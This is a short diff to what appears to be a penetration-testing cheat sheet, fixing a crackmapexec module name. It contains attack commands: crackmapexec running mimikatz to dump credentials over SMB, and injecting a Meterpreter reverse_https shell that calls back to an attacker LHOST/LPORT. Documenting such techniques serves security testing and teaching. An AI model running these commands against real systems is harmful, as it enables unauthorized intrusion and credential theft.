@@ -1009,7 +1009,7 @@ crackmapexec smb <TARGET | TARGETS> -M mimikatz (-d <DOMAIN> | --local-auth) -u 
 # Meterpreter.
 # msf > use multi/handler
 # msf exploit(handler) > set payload windows/meterpreter/reverse_https
-crackmapexec smb <TARGET | TARGETS> -M metinject -o LHOST=<HOST> LPORT=<PORT> -d <DOMAIN> -u <USERNAME> (-p <PASSWORD | PASSWORDS_FILE> | -H <HASH>)
+crackmapexec smb <TARGET | TARGETS> -M met_inject -o LHOST=<HOST> LPORT=<PORT> -d <DOMAIN> -u <USERNAME> (-p <PASSWORD | PASSWORDS_FILE> | -H <HASH>)
 ```
 
 For more information on how to remotely extract credentials from the `SAM`
